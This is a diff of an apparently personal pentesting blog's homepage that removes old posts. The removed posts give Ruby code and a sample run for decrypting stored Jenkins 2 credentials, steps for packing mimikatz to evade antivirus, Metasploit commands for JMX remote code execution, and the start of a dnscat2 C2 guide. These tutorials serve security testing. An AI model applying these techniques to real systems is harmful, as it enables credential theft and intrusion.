@@ -1,24 +1,22 @@
 <!DOCTYPE html>
-<html xmlns="https://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
 <head>
-  <link href="https://gmpg.org/xfn/11" rel="profile">
+  <link href="//gmpg.org/xfn/11" rel="profile">
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="generator" content="Hugo 0.17" />
+  <meta name="generator" content="Hugo 0.54.0" />
 
   
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title> The Subtlety &middot; The Subtlety </title>
+  <title>The Subtlety</title>
 
   
-  <link rel="stylesheet" href="https://www.thesubtlety.com/css/poole.css">
-  <link rel="stylesheet" href="https://www.thesubtlety.com/css/syntax.css">
-  <link rel="stylesheet" href="https://www.thesubtlety.com/css/hyde.css">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link type="text/css" rel="stylesheet" href="https://www.thesubtlety.com/css/print.css" media="print">
+  <link type="text/css" rel="stylesheet" href="https://www.thesubtlety.com/css/poole.css">
+  <link type="text/css" rel="stylesheet" href="https://www.thesubtlety.com/css/syntax.css">
+  <link type="text/css" rel="stylesheet" href="https://www.thesubtlety.com/css/hyde.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface|PT+Sans:400,400i,700">
 
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
-  <script>hljs.initHighlightingOnLoad();</script>
 
   
   <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.thesubtlety.com/apple-touch-icon-144-precomposed.png">
@@ -26,11 +24,12 @@
 
   
   <link href="https://www.thesubtlety.com/index.xml" rel="alternate" type="application/rss+xml" title="The Subtlety" />
+
+  
 </head>
 
-<body class="">
-
-<div class="sidebar">
+  <body class=" ">
+  <aside class="sidebar">
   <div class="container sidebar-sticky">
     <div class="sidebar-about">
       <a href="https://www.thesubtlety.com/"><h1>The Subtlety</h1></a>
@@ -39,1340 +38,277 @@
       </p>
     </div>
 
-    <ul class="sidebar-nav">
-      <li><a href="https://www.thesubtlety.com/">Home</a> </li>
-      
-
-      <li><a href="https://www.thesubtlety.com/about/">About</a> </li>
-      
-    </ul>
-
-    
-      <script type="text/javascript">
-        var _gaq = _gaq || [];
-        _gaq.push(['_setAccount', 'UA-29425132-1']);
-        _gaq.push(['_trackPageview']);
-
-        (function() {
-          var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-          ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-          var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-        })();
-      </script>
-    
-
-    <p>&copy; 2017. All rights reserved. </p>
-  </div>
-</div>
-
-
-    <div class="content container">
-<div class="posts">
-
-      
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/2017-06-21-decrypting-jenkins2-credentials/">
-        Decrypting Jenkins 2 Credentials
-      </a>
-    </h1>
-
-    <span class="post-date">Wed, Jun 21, 2017</span>
-
-    <p><img src="https://www.thesubtlety.com/img/jenkins.png#floatright" alt="jenkins" />
-I like Jenkins. It&rsquo;s a good orchestration tool and provides remote code execution as a service.</p>
-
-<p>If your user permissions give you access to the script console <code>/script</code> it&rsquo;s trivial to obtain a shell. The developers explicitly call this out in their <a href="https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Script+Console">documentation</a> as well so it&rsquo;s a feature, not a bug.  Of course if you can create a job you can run shell commands as well, but I&rsquo;ll leave that for another time.</p>
-
-<p>I&rsquo;ve often seen privileged credentials stored here - from developer SSO credentials to service accounts to AWS keys and secrets. Given file system access or backup files with the key material, the encrypted secrets can easily be decrypted. This is pretty common knowledge and a really good write up on decrypting Jenkins credentials is at <a href="http://xn--thibaud-dya.fr/jenkins_credentials.html">thiébaud.fr</a> along with a simple python decrypt <a href="https://github.com/tweksteen/jenkins-decrypt/blob/master/decrypt.py">script</a>.</p>
-
-<p>But there was a recent change to how Jenkins strings are encrypted and the existing decrypt scripts no longer work on Jenkins 2 as of about Jenkins version 2.44 which was released around February 1, 2017. This change was due to the following security advisory <a href="https://jenkins.io/security/advisory/2017-02-01/">SECURITY-304</a> and CVE-2017-2598.</p>
-
-<blockquote>
-<p><strong>Use of AES ECB block cipher mode without IV for encrypting secrets</strong></p>
-
-<p>Secrets such as passwords are typically stored on disk and sent to users as part of some pages in encrypted form. These were encrypted using AES-128 ECB without IV, which exposes Jenkins and the stored secrets to unnecessary risks. Jenkins now encrypts secrets using AES-128 CBC with random IV.</p>
-</blockquote>
-
-<p>The relevant pull request with changes on Github is <a href="https://github.com/jenkinsci/jenkins/commit/e6aa166246d1734f4798a9e31f78842f4c85c28b">here</a>. We see that the <a href="https://github.com/jenkinsci/jenkins/blob/e6aa166246d1734f4798a9e31f78842f4c85c28b/core/src/main/java/hudson/util/HistoricalSecrets.java">old encryption function</a> has been pulled out into HistoricalSecrets.  Let&rsquo;s look at the <a href="https://github.com/jenkinsci/jenkins/blob/e6aa166246d1734f4798a9e31f78842f4c85c28b/core/src/main/java/hudson/util/Secret.java#L118">new encryption function</a>. It now uses CBC instead of ECB and utilizes an IV. The master secret encryption method didn&rsquo;t look to change, but the secrets encryption and decryption methods did.</p>
-
-<p><img src="https://www.thesubtlety.com/img/jdiff.png" alt="diff" /></p>
-
-<p>I&rsquo;m partial to Ruby and fortunately we can modify some previous work done by Github user <em>juyeong</em> who wrote a <a href="https://gist.github.com/juyeong/081379bd1ddb3754ed51ab8b8e535f7c">decrypt script</a> in Ruby for the original Jenkins encryption method. If we copy paste the new decrypt function&rsquo;s byte shifting code into that Ruby script we see that it can be used with just a bit of modification. After some slight massaging to get the ciphers working with Ruby, and extracting the IV and encrypted secret I landed on the below. We still use the original ECB decryption function to obtain the decryption key from the <code>master.key</code> and <code>hudson.util.Secret</code> files. We then leverage that key to decrypt the encrypted secrets.</p>
-
-<pre><code class="ruby">
-    def try_decrypt(encrypted,key)
-      encrypted_text = Base64.decode64(encrypted).bytes
-
-      iv_length = ((encrypted_text[1] & 0xff) << 24) | ((encrypted_text[2] & 0xff) << 16) | ((encrypted_text[3] & 0xff) << 8) | (encrypted_text[4] & 0xff)
-      
-      data_length = ((encrypted_text[5] & 0xff) << 24) | ((encrypted_text[6] & 0xff) << 16) | ((encrypted_text[7] & 0xff) << 8) | (encrypted_text[8] & 0xff)
-      
-      if encrypted_text.length != (1 + 8 + iv_length + data_length)
-          abort 'invalid encrypted string'
-      end
-      iv = encrypted_text[9..(9 + iv_length)].pack('C*')
-      code = encrypted_text[(9 + iv_length)..encrypted_text.length].pack('C*')
-
-      cipher = OpenSSL::Cipher.new('AES-128-CBC')
-      cipher.decrypt
-      cipher.key = key
-      cipher.iv = iv
-
-      text = cipher.update(code) + cipher.final
-      if text.length == 32 #Guessing API token
-        text = Digest::MD5.new.update(text).hexdigest
-      end
-      text
-</code></pre>
-
-<p>So given the <code>master.secret</code>, the <code>hudson.util.Secret</code>, and an encrypted string (within <code>credentials.xml</code> in this case), we can pass those files to the updated script and obtain the plaintext secrets.</p>
-
-<pre><code class="nohighlight">
--&gt; % <b>cat credentials.xml</b>
-&lt;?xml version='1.0' encoding='UTF-8'?&gt;
-&lt;com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@2.1.14"&gt;
-  &lt;domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"&gt;
-    &lt;entry&gt;
-      &lt;com.cloudbees.plugins.credentials.domains.Domain&gt;
-        &lt;specifications/&gt;
-      &lt;/com.cloudbees.plugins.credentials.domains.Domain&gt;
-      &lt;java.util.concurrent.CopyOnWriteArrayList&gt;
-        &lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
-          &lt;scope&gt;GLOBAL&lt;/scope&gt;
-          &lt;id&gt;2de25363-96dc-495b-b258-1ccb3366f5a6&lt;/id&gt;
-          &lt;description&gt;&lt;/description&gt;
-          <b>&lt;username&gt;testuser&lt;/username&gt;</b>
-          <b>&lt;password&gt;{AQAAABAAAAAQd42B1h85u14cpl37q0qSekGHvTLrKx0+veCjouoYTGs=}&lt;/password&gt;</b>
-        &lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
-      &lt;/java.util.concurrent.CopyOnWriteArrayList&gt;
-    &lt;/entry&gt;
-  &lt;/domainCredentialsMap&gt;
-&lt;/com.cloudbees.plugins.credentials.SystemCredentialsProvider&gt;%              
-
--&gt; % <b>ruby decrypt_jenkins2.rb master.key hudson.util.Secret credentials.xml
-testuser:Password123</b>
-</code></pre>
-
-<p>The full Jenkins 2 decrypt script is up on Github: <a href="https://gist.github.com/thesubtlety/e7d26891227f0b68b9d5db1ea9870c62">https://gist.github.com/thesubtlety/e7d26891227f0b68b9d5db1ea9870c62</a></p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/2017-04-19-using-katz-to-reflectively-load-exe/">
-        Using subTee&#39;s katz to Reflectively Load an exe
-      </a>
-    </h1>
-
-    <span class="post-date">Wed, Apr 19, 2017</span>
-
-    
-
-<p>I haven&rsquo;t seen this specifically outlined anywhere so I figured I&rsquo;d write a short post to go over using subTee&rsquo;s <a href="https://github.com/subTee/Utils">Katz2.0</a> program to create a custom binary that loads mimikatz (or whatever executable you&rsquo;d like) into memory. Casey Smith (<a href="https://github.com/subTee">subTee</a>) and company have created some incredible tools that have made my life easier, so hats off to them.</p>
-
-<h3 id="reflective-injection">Reflective Injection</h3>
-
-<p>The following steps will create a custom binary with an encrypted and encoded mimikatz binary string which will load mimikatz into memory through <a href="https://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/">reflective PE injection</a>.</p>
-
-<ol>
-<li>Compile <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> for release - remember it&rsquo;s architecture specific so you&rsquo;ll probably want to compile both or download the binaries</li>
-<li>Download subTee&rsquo;s <a href="https://github.com/subTee/Utils">Katz2.0</a>. <a href="https://github.com/thesubtlety/Utils/blob/master/katz2.0.cs">My fork</a> simply makes the encryption method easier to access and outputs the base64. The following is based on that.</li>
-<li>Open in Visual Studio
-
-<ol>
-<li>Find/Replace &ldquo;password&rdquo; with something more subtle like &ldquo;WaitForSingleObject&rdquo;</li>
-<li>Find &ldquo;SALT&rdquo; and replace those bytes with <code>0xde 0xad 0xbe 0xef</code> and so on.</li>
-<li>Compile Katz2.0</li>
-</ol></li>
-<li>And run the resulting binary pointing to your mimikatz executable
-
-<ol>
-<li><code>c:\&gt;katz.exe encrypt c:\path\to\mimikatz64.exe | clip</code></li>
-</ol></li>
-<li>If you <code>clip</code>d from before this will be in your clipboard, otherwise copy the output string from newly created <code>file.b64</code></li>
-<li>Paste that string into the <code>filex64</code> variable (at the bottom of Katz2.0.cs)</li>
-<li>And now rebuild Katz2.0 again</li>
-<li>Note that you could/should repeat this process for the x86 mimikatz binary</li>
-</ol>
-
-<p>Now when you run the katz2.0 binary without any arguments, mimikatz should be loaded into memory and run without issue. This will get by most AV out there although some programs may flag some mimikatz functionality (e.g. dumping <code>sekurlsa::logonpasswords</code>).</p>
-
-<h3 id="similar-projects">Similar projects</h3>
-
-<ul>
-<li><p><a href="https://github.com/Cn33liz/p0wnedShell">p0wnedShell</a> is pretty sweet, and does a similar thing although it&rsquo;s considerably larger including more tools</p></li>
-
-<li><p>Customize mimikatz to reflectively load the DLL into memory - great post <a href="https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/">here</a></p></li>
-
-<li><p>Similar work by subTee lets you execute shellcode using JScript <a href="https://subt0x10.blogspot.com/2017/04/using-dotnettojscript-working-example.html">here</a></p></li>
-
-<li><p>For more fully featured obfuscation, <a href="https://cobbr.io/ObfuscatedEmpire.html">ObfuscatedEmpire</a> is an awesome integration of Invoke-Obfuscation and Empire. Highly recommend checking it out.</p></li>
-
-<li><p>Similar but using <code>Invoke-Mimikatz</code> - simply make a few string modifications to slip by AV - <a href="http://www.blackhillsinfosec.com/?p=5555">BHIS</a></p></li>
-
-<li><p>Powershell without powershell.exe - <a href="http://www.blackhillsinfosec.com/?p=5257">Also by BHIS</a></p></li>
-</ul>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/2017-03-13-informacast-singlewire-insecure-jmx/">
-        Informacast Singlewire Insecure JMX Config to RCE
-      </a>
-    </h1>
-
-    <span class="post-date">Mon, Mar 13, 2017</span>
-
-    
-
-<p>I recently came across a good reminder to double check listening ephemeral ports. The organization in question was using the <a href="https://www.singlewire.com/informacast-desktop-notifier.html">Informacast Singlewire Desktop Notifier</a> v2.0 application. It allows organizations &ldquo;to display a pop-up window on top of other running applications to inform users of important information&rdquo; or to send desktop alerts to users in geographic regions.</p>
-
-<p>After some enumeration, it looked like it was exposing a <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.html">JMX Remote management</a> port of we&rsquo;ll say port 42424. Nmap won&rsquo;t identify the service version in a normal scan, but if you request <code>--version-all</code>, you should see the port listed as rmiregistry.</p>
-
-<p><code>#nmap -p 42424 -sV --version-all 172.16.42.42</code></p>
-
-<pre><code>PORT 	  STATE     SERVICE 	VERSION
-42424/tcp open	    rmiregistry	Java RMI
-</code></pre>
-
-<p>You can connect to the service legitimately with <code>jconsole</code> available in Kali to verify the service as well. This will get you Java debug info, the hostname, username, and the ability to invoke various functions with <code>jconsole ip.add.re.ss:42424</code>. Nmap also has the <code>rmi-dumpregistry</code> script to gather more information.</p>
-
-<p><img src="https://www.thesubtlety.com/img/s1.png" alt="jconsole" /></p>
-
-<p>As we&rsquo;ll later discover, the application was running with some suspect options:</p>
-
-<pre><code>-Dcom.sun.management.jmxremote.port=42424 
--Dcom.sun.management.jmxremote.authenticate=false 
--Dcom.sun.management.jmxremote.ssl=false 
-com.berbee.ippaging.desktop.SpelDesktopAgent
-</code></pre>
-
-<p>Unfortunately for this organization, the fine folks at Optiv (Braden Thomas) had done a bit of <a href="https://www.optiv.com/blog/exploiting-jmx-rmi">research</a> extending an insecure <a href="https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server">Java RMI configuration</a> exploit which led to the creation of the <a href="https://www.exploit-db.com/exploits/36101/">Java JMX Insecure Configuration</a> Metasploit module to abuse this insecure configuration. With authentication disabled and an application using poor secure coding practices, this exploit respectfully offers up a user shell.</p>
-
-<pre><code>#msfconsole
-&gt;use exploit/multi/misc/java_jmx_server
-..set RHOST and LPORT
-&gt;exploit
-</code></pre>
-
-<p><img src="https://www.thesubtlety.com/img/s2.png" alt="jconsole" /></p>
-
-<p>And since this was deployed to the entire Windows fleet, all machines had this nice little backdoor installed. Fortunately this product version is end of life&rsquo;d but there is no mention of the issue in any Informacast documentation. The word I heard back from the vendor was to &ldquo;update to the latest version&rdquo; which apparently has no Java dependencies.</p>
-
-<p><a href="http://bytesdarkly.com/2016/01/know-your-tools-cve-2015-2342-ioc-and-metasploit/">Bytes Darkly</a> has some IOCs written up on the Metasploit payload which are worth checking out as well.</p>
-
-<h2 id="resources">Resources</h2>
-
-<ul>
-<li><a href="https://www.optiv.com/blog/exploiting-jmx-rmi">https://www.optiv.com/blog/exploiting-jmx-rmi</a></li>
-<li><a href="http://bytesdarkly.com/2016/01/know-your-tools-cve-2015-2342-ioc-and-metasploit/">http://bytesdarkly.com/2016/01/know-your-tools-cve-2015-2342-ioc-and-metasploit/</a></li>
-</ul>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/2017-02-11-osce-review/">
-        The OSCE | Cracking the Perimeter Review
-      </a>
-    </h1>
-
-    <span class="post-date">Sat, Feb 11, 2017</span>
-
-    
-
-<p><img src="https://www.thesubtlety.com/img/ctp-boxes-small.png#floatright" alt="ctp" />
-I recently took the <a href="https://www.offensive-security.com/information-security-training/cracking-the-perimeter/">CTP course</a> by Offensive Security and passed the OSCE exam. Now there are a few dozen <a href="https://www.google.com/search?q=osce+exam+review">reviews</a> on this thing, but I&rsquo;ll add my own take here anyway.</p>
-
-<h3 id="pre-course">Pre Course</h3>
-
-<p>You can&rsquo;t just register for the CTP - you need to solve a small challenge first: <a href="http://fc4.me/">http://fc4.me/</a>. When I initially thought about taking this course, part of this challenge was beyond me. But to quote <a href="https://blog.g0tmi1k.com/2013/08/cracking-perimeter-ctp-offensive/">g0tmi1k</a>:</p>
-
-<blockquote>
-<p>&ldquo;There isn&rsquo;t any shame in not being able to complete this. It simply means you&rsquo;re not ready&hellip; yet! If you look up the solution online, you&rsquo;re just cheating yourself and wasting both time and money. It&rsquo;s been put there for a reason. Offsec is trying to protect you from yourself (in their own frustrating but necessary way!).&rdquo;</p>
-</blockquote>
-
-<p>And so I began my prep for the course. Corelan&rsquo;s <a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">exploit dev tutorials</a>, Fuzzysec&rsquo;s <a href="https://www.fuzzysecurity.com/tutorials.html">tutorials</a>, and Stephen Bradshaw&rsquo;s <a href="http://www.thegreycorner.com/2010/12/introducing-vulnserver.html">Vulnserver</a> helped immensely. Having gone through, played with, and poked at that material, I was able to solve the initial challenge and set a course start date.</p>
-
-<h3 id="course">Course</h3>
-
-<p>The CTP syllabus is available <a href="https://www.offensive-security.com/documentation/cracking-the-perimiter-syllabus.pdf">here</a> and gives a high level overview of what is covered. If you&rsquo;ve taken the OSCP, it doesn&rsquo;t cover nearly as much ground, and is much more focused on the following topics.</p>
-
-<p><strong>Web Application Angle</strong> - The two modules covered here are a bit more complex that what you&rsquo;d find in the OSCP but nothing too ground breaking. XSS, CSRF, LFI are covered but the scenarios are more real world than trivial examples I&rsquo;ve seen elsewhere. Still valuable.</p>
-
-<p><strong>Backdooring and AV Bypass</strong> - I hadn&rsquo;t done this before and thought these modules were pretty fun. I fully realized that AV today is &hellip; less than perfect and is really only catching the known bad. There are a billion ways to bypass even heuristics, especially if you can write just the smallest amount of code.</p>
-
-<p><strong>0 Day Angle</strong> - These modules cover fuzzing and the infamous HP Openview NNM exploit. NNM is usually what people talk about when they bring up the course. Muts actually covers this crazy exploit at Defcon 16 in this <a href="https://www.youtube.com/watch?v=gHISpAZiAm0">video</a>. This module makes up a larger portion of the course work and was pretty enjoyable. I must say having read <em>Hacking: The Art of Exploitation</em> and having some of those code samples available was also helpful to me here.</p>
-
-<p><strong>Networking Angle</strong> - Spoofing SNMP and GRE tunnels. I barely recall this module. Although though seeing how devastating (and relatively straight forward) a MiTM attack can be at the infrastructure level was certainly eye opening.</p>
-
-<p>I learned a ton in this course. Definitely realized that the amount I don&rsquo;t know about exploit development is pretty staggering. This is supposed to be an intermediate course but looking at the amount of research out there, some of this feels pretty entry level as the heap and ROP aren&rsquo;t even mentioned. That said, the scope of the CTP is a bit wider than just exploit development, so maybe that&rsquo;s a bit unfair, and I still found the course challenging. Several reviews do mention the dated material and that may be true, but I felt what was taught was entirely foundational. A person must walk before they run and the CTP course does an excellent job doing just that.</p>
-
-<p>Of course even excellent courses can be improved, and one thing that gave a bit of dissatisfaction was the lack of Extra Mile exercises going through the course like the OSCP course did. It seemed you could complete a module easily enough following the directions, have an basic starting point of where to research more, and then it was off to the next chapter. And perhaps this is by design, but I think I learned more while practicing for the exam than during the course itself. The course material gave me starting points, skeletons to work from, ideas to use, and from there I was able to fill in the blanks through additional research and practice.</p>
-
-<h3 id="exam">Exam</h3>
-
-<p>The 48 hour exam was not easy. The number of times I thought I was completely screwed, unprepared, and guaranteed failure was more than a few. And it was still somehow enjoyable! In general I found myself realizing I needed to think laterally, to take a step back and look at the big picture. The feeling of accomplishment after hours working through various potential paths and finally succeeding is hard to beat. I felt the OSCE exam had the perfect level of challenge and frustration without that feeling of impossibility. While everything on the exam is covered in the the course in principle, OffSec will never let you simply follow the directions to success. They teach principles and techniques and let you apply them creatively.</p>
-
-<p>I spent around sixteen hours on the exam the first day with quick breaks for coffee and lunch and forced myself to go to sleep before 1 am. I got around seven hours of sleep and then did another sixteen hours the next day before successfully completing all the challenges for full points. I strongly recommend getting a good night&rsquo;s rest the first night and come back the next day planning on working late if need be.</p>
-
-<p>All in all, the CTP course was informative and valuable and the exam enjoyably challenging. Highly recommended.</p>
-
-<h3 id="helpful-resources">Helpful Resources</h3>
-
-<ul>
-<li><a href="https://github.com/jhaddix/tbhm">Web - Jason Haddix Bug Hunting Guide</a></li>
-<li><a href="http://packetstorm.foofus.com/papers/virus/BypassAVDynamics.pdf">AV Bypass Techniques</a></li>
-<li><a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/">AV Bypass and PE Backdoors</a></li>
-<li><a href="https://packetstormsecurity.com/papers/virus/Taking_Back_Netcat.pdf">AV Bypass - Taking Back Netcat</a></li>
-<li><a href="https://github.com/secfigo/Awesome-Fuzzing">Fuzzing - Awesome-Fuzzing on Github</a></li>
-<li><a href="http://resources.infosecinstitute.com/fuzzing-vulnserver-discovering-vulnerable-commands-part-1/">Fuzzing - Vulnserver Intro</a></li>
-<li><a href="http://www.thegreycorner.com/2010/12/introducing-vulnserver.html">Fuzzing and Exploit Dev - Vulnserver</a></li>
-<li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">Exploit Dev - Corelan Tutorials</a></li>
-<li><a href="https://raw.githubusercontent.com/corelan/wallpapers/master/corelan_wallpaper_dark_1920-1080.png">Exploit Dev - Corelan Wallpaper</a></li>
-<li><a href="https://www.fuzzysecurity.com/tutorials.html">Exploit Dev - FuzzySec Windows Exploit Development Tutorial Series</a></li>
-<li><a href="https://github.com/enddo/awesome-windows-exploitation">Exploit Dev - Awesome Windows Explation on Github</a></li>
-<li><a href="http://www.vividmachines.com/shellcode/shellcode.html">Exploit Dev - How To Shellcode</a></li>
-<li><a href="http://www.gosecure.it/blog/art/452/sec/create-a-custom-shellcode-using-system-function/">Exploit Dev - Shellcode with System()</a></li>
-<li><a href="https://github.com/JohnTroony/HTAOE/blob/master/printable_helper.c">Exploit Dev - ASCII Sub Generator</a></li>
-</ul>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/2017-01-25-query-shodan-and-censys-with-shocens/">
-        Search Shodan and Censys With Shocens
-      </a>
-    </h1>
-
-    <span class="post-date">Wed, Jan 25, 2017</span>
-
-    
-
-<p>Recon is close to <a href="http://www.pentest-standard.org/index.php/Intelligence_Gathering">step one</a> in any pentest. When it comes to passively pulling data on infrastructure assets you have a number of options. <a href="https://whois.arin.net/ui/advanced.jsp">ARIN</a> can help identify an organization&rsquo;s registered net blocks, but that&rsquo;s only part of the picture. With many organizations based in or using cloud services, those assets won&rsquo;t necessarily be registered to your target.</p>
-
-<p>And when AWS for example can tie <a href="https://aws.amazon.com/directconnect/">directly into a datacenter</a>, these servers become quite valuable. As an aside to AWS, check out <a href="https://media.ccc.de/v/33c3-7865-gone_in_60_milliseconds">Gone in 60 Milliseconds</a> by <a href="https://github.com/Miserlou">Rich Jones</a> - awesome talk. Now if a developer stands up a server with HTTPS using a corporate certificate it&rsquo;s likely going to be picked up and indexed by someone, Shodan, or Censys - so let&rsquo;s make use of that.</p>
-
-<h2 id="shocens">Shocens</h2>
-
-<p>I&rsquo;ll cover Shodan and Censys in a bit more detail below, but suffice it to say I needed a tool that queried these search engines for specific organizations and let me do something useful with the data. Built in tools for Shodan are great for macro searches but I found myself wanting more when targeting a specific organization that had more than a few pages of data but didn&rsquo;t consist of hundreds of thousands of results. The Python APIs and CLI tools available just weren&rsquo;t quite what I was looking for.</p>
-
-<p>This being my small motivation along with a desire to do some more Ruby development, I wrote <strong>Shocens</strong> - a little tool to</p>
-
-<ul>
-<li>make basic queries of both Shodan and Censys</li>
-<li>parse the results with options to diff against past scans</li>
-<li>and output to csv and txt</li>
-</ul>
-
-<p>There is still a lot of potential to parse additional data from both search engines and cross query to fill in the blanks where one search engine has data while the other does not. It&rsquo;s less than perfect, and you&rsquo;ll obviously find the native search engines provide more power for complex queries. But it was fun to write, and still provides me a bit of value.</p>
-
-<p>More details on Shocens usage are available on Github - <a href="https://github.com/thesubtlety/shocens">https://github.com/thesubtlety/shocens</a></p>
-
-<pre><code>-&gt; % ruby shocens.rb -q 'parsed.extensions=&quot;shodan&quot;' -l 100
-[+] Beginning Shodan search for org:google
-[+] 687497 results in org:&quot;google&quot;
-[+] Limiting results to 1 pages...
-
-[+] Parsing page 1 of 1
-
-Host:		104.131.0.69: ports 80
-Server:		nginx/1.4.6 (Ubuntu)
-Powered By:	
-Title:		Shodan Internet Census
-Cert Names:	
-</code></pre>
-
-<p>Following is a brief overview of both Shodan and Censys along with various useful search filters.</p>
-
-<h2 id="shodan">Shodan</h2>
-
-<p><a href="https://www.shodan.io/">Shodan</a> is &ldquo;the world&rsquo;s first search engine for Internet-connected devices&rdquo;. There are quite a few resources out there on what Shodan is and how to use it so I won&rsquo;t go into great detail. The slogan sums it up quite well. If there is a device reachable on the internet and you know what to look for, Shodan will help you find it.</p>
-
-<h4 id="search-filters">Search Filters</h4>
-
-<p>Where the real beauty of Shodan comes in is with filters</p>
-
-<ul>
-<li><code>net:10425.89.0/24</code></li>
-<li><code>org:Microsoft</code></li>
-<li><code>title:tagged-scraped-content</code></li>
-<li><code>html:search-the-page</code></li>
-<li><code>product:banner-id</code></li>
-<li><code>version:v1.2.3</code></li>
-<li><code>city:Seattle</code></li>
-<li><code>country:USA</code></li>
-<li><code>geo:12.3456,78.9087</code></li>
-<li><code>hostname:.edu</code></li>
-<li><code>os:AIX</code></li>
-<li><code>port:80</code></li>
-<li><code>before/after:01/01/1970</code></li>
-</ul>
-
-<p>Depending on what you&rsquo;re looking to accomplish a combination of <code>net</code>, <code>html</code>, and <code>org</code> have served me well for targeted recon. See the <a href="https://developer.shodan.io/api/banner-specification">banner-specs</a> for more possible filters. And John Matherly himself wrote the <a href="https://leanpub.com/shodan">Complete Guide to Shodan</a> starting at one dollar which is probably worth checking out.</p>
-
-<h4 id="apis-and-credits">APIs and Credits</h4>
-
-<p>It&rsquo;s worth noting you&rsquo;ll need an account to do anything useful with Shodan (beyond a simple query with one page of results). Using filters, seeing results beyond one page, and using the API requires a paid account. It&rsquo;s only around ~$45USD, there are frequent deals on paid membership for full API access, maybe free for .edu, and totally worth it. This will give you around 10,000 results per month. Register <a href="https://account.shodan.io/register">here</a>.</p>
-
-<h4 id="resources">Resources</h4>
-
-<ul>
-<li><a href="https://pen-testing.sans.org/blog/2015/12/08/effective-shodan-searches/">Effective Shodan Searches</a></li>
-<li><a href="https://danielmiessler.com/study/shodan/">A Shodan Tutorial</a></li>
-<li><a href="https://www.exploit-db.com/docs/33859.pdf">Searching Shodan for Fun and Profit</a></li>
-</ul>
-
-<h2 id="censys">Censys</h2>
-
-<p><a href="https://censys.io/">Censys.io</a> is &ldquo;a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet&rdquo;. Same thing as Shodan - it lets you identify what&rsquo;s out there. They pull data daily and use Zmap to get their <a href="https://scans.io/">data</a>.</p>
-
-<h4 id="search-filters-1">Search Filters</h4>
-
-<ul>
-<li>Supports everything Shodan does and then some</li>
-</ul>
-
-<p>Actually, just go check out their website. The documentation is quite good. The <a href="https://censys.io/overview">Overview page</a>, Examples tab has basic query examples, but you can really filter on just about anything. The following page covers a few: <a href="https://www.censys.io/ipv4/72.14.246.220/table">https://www.censys.io/ipv4/72.14.246.220/table</a></p>
-
-<p>Again, depending on what you&rsquo;re looking for, I&rsquo;ve had good luck using CIDR blocks: <code>127.0.0.1/24</code>, parsing
-certificates: <code>parsed.extensions=domain.tld</code>, and ASes: <code>autonomous_system:description: 'Org Name'</code>.</p>
-
-<h4 id="apis-and-rate-limits">APIs and Rate Limits</h4>
-
-<p>Again, you&rsquo;ll need an account. Censys usage is free, though and you can register <a href="https://censys.io/register">here</a>. You aren&rsquo;t limited by specific searches per month per se as with Shodan, but rather you get a limited number of requests per five minute bucket.</p>
-
-<h4 id="resources-1">Resources</h4>
-
-<ul>
-<li><a href="https://censys.io/about">About Censys</a></li>
-<li><a href="https://jhalderm.com/pub/papers/censys-ccs15.pdf">A Search Engine Backed by Internet-Wide Scanning</a></li>
-</ul>
-
-<p>Thanks for reading and happy searching!</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="https://www.thesubtlety.com/post/persistent-dnscat2/">
-        Persistent C2 with dnscat2
-      </a>
-    </h1>
-
-    <span class="post-date">Mon, Dec 19, 2016</span>
-
-    
-
-<p>Occasionally an environment has strict outbound rules with all traffic going through an authenticated proxy. This hampers exfiltration, especially if you don&rsquo;t currently have valid credentials but need a foothold into an environment without phishing for instance. If we can find a live network jack in some accessible place and the switch hands out an IP address via DHCP along with DNS servers, we can more than likely obtain a foothold into the network.</p>
-
-<p>Thanks to some awesome work by <a href="https://twitter.com/iagox86">iagox86</a>, these directions can be used to configure <a href="https://github.com/iagox86/dnscat2">dnscat2</a> to automatically connect back to your server over DNS in an automated fashion, similar to a PwnPlug.</p>
-
-<h2 id="prerequisites">Prerequisites</h2>
-
-<ul>
-<li>A linux box (raspberry pi)</li>
-<li>A domain name</li>
-<li>A VPS</li>
-</ul>
-
-<h2 id="directions">Directions</h2>
